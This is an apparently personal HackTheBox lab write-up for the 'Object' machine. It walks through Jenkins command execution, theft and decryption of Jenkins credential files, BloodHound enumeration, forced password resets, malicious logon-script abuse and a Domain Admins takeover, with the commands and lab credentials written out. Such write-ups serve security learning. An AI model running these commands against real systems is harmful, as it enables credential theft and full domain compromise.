# [Object](https://app.hackthebox.com/machines/Object)

```bash
nmap -p- --min-rate 10000 10.10.11.132 -Pn 
```

![Alt text](img/image.png)

After discovering open ports, let's do greater nmap scan.

```bash
nmap -A -sC -sV -p80,5985,8080 10.10.11.132
```

![Alt text](img/image-1.png)


For port (8080), there is `Jenkins` application is up.

I create an account and login into Jenkins.

![Alt text](img/image-2.png)

![Alt text](img/image-3.png)

Dr4ks: Dr4ks


I create a job for Dr4ks user.


I select `Execute Windows batch command` for Build section on Job.

![Alt text](img/image-4.png)

I also add cronjob time (means **every minute**)

![Alt text](img/image-5.png)


I can see output as below.

![Alt text](img/image-6.png)


`Jenkins Enumeration` starts from here.

![Alt text](img/image-7.png)

config.xml is here.

![Alt text](img/image-8.png)


Let's copy this via below command.
```bash
powershell -c cat ..\..\users\admin_17207690984073220035\config.xml
```

![Alt text](img/image-9.png)


I also took `master.key` file from `secrets` folder

```bash
powershell -c cat ..\..\secrets\master.key
```

![Alt text](img/image-10.png)

I need to get `hudson.util.secret` file via below command (as because it is binary, I need to get this `base64` encoded).

```bash
powershell -c [convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte)) 
```

![Alt text](img/image-12.png)

![Alt text](img/image-11.png)


I will use [offline Jenkins decryptor](https://github.com/gquere/pwn_jenkins)


```bash
python3 jenkins_offline_decrypt.py /home/kali/Desktop/master.key /home/kali/Desktop/hudson.util.secret /home/kali/Desktop/config.xml 
```

![Alt text](img/image-13.png)


This is the credentials of `oliver` user.

oliver: c1cdfun_d2434


Let's get  into machine via this credentials by using `evil-winrm` tool.

```bash
evil-winrm -i 10.10.11.132 -u oliver -p c1cdfun_d2434
```

user.txt

![Alt text](img/image-14.png)


Let's use `SharpHound.ps1` on target machine then download this zip file on attacker's machine to see what's going on.

```bash
upload SharpHound.exe
.\SharpHound.exe -c all
download C:\ProgramData\{zip_file}
```


![Alt text](img/image-15.png)

![Alt text](img/image-16.png)


Then start `Bloodhound`.

```bash
neo4j console
bloodhound
```


From this image, I see that for `Oliver` user has `ForceChangePassword` privilege against `Smith` user.

![Alt text](img/image-17.png)


To change password of 'Smith' user, we need to do below actions.

```bash
upload PowerView.ps1
. .\PowerView.ps1
$newpass = ConvertTo-SecureString 'dr4ksdr4ks@' -AsPlainText -Force
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
```

![Alt text](img/image-18.png)

Now, we can login into `Smith` user via credentials which we set previously.


smith: dr4ksdr4ks@


Let's connect via `evil-winrm` command.

```bash
evil-winrm -i 10.10.11.132 -u smith -p 'dr4ksdr4ks@'
```

![Alt text](img/image-19.png)


Pivoting to `Maria` user, from Bloodhound result, I saw that `Smith` user has `GenericWrite` privilege against `Maria` user.

![Alt text](img/image-20.png)


That's why I will use this [blog](https://www.thehacker.recipes/a-d/movement/dacl/logon-script) to enumerate Desktop of `maria` user.

My malicious script to enumerate Desktop of `Maria` user.
```bash
ls \users\maria\desktop\ > \programdata\out2
```

I need to add this cmd.ps1 script into `Maria` user's **scriptpath**
```bash
Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
```

![Alt text](img/image-21.png)


Now, let's change malicious Powershell script via copying Excel data.
```bash
echo "copy \users\maria\desktop\Engines.xls \programdata\" > cmd.ps1  
```

![Alt text](img/image-22.png)


Download this data and read.

![Alt text](img/image-23.png)

username:
maria

passwords:
d34gb8@
0de_434_d545
W3llcr4ft3d_4cls

Let's use `crackmapexec` tool to find correct credentials.

```bash
crackmapexec winrm 10.10.11.132 -u maria -p passwords -d 'object.htb'
```

![Alt text](img/image-24.png)


Hola, we found credentials of `maria` user.

maria:W3llcr4ft3d_4cls


From `bloodhound` results, I saw that 'Maria' user has '**WriteOwner**' privilege on `Domain Admins` group.

![Alt text](img/image-25.png)


To abuse this, we need to run below commands.
```bash
. .\PowerView.ps1
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

![Alt text](img/image-26.png)


We need to exit from here, again login and see that we can check via `net user maria` command that we know that this user belongs to 'Object\Domain Admins'

![Alt text](img/image-27.png)


Also, we can check exactly via `whoami /groups` command.

![Alt text](img/image-28.png)


root.txt

![Alt text](img/image-29.png)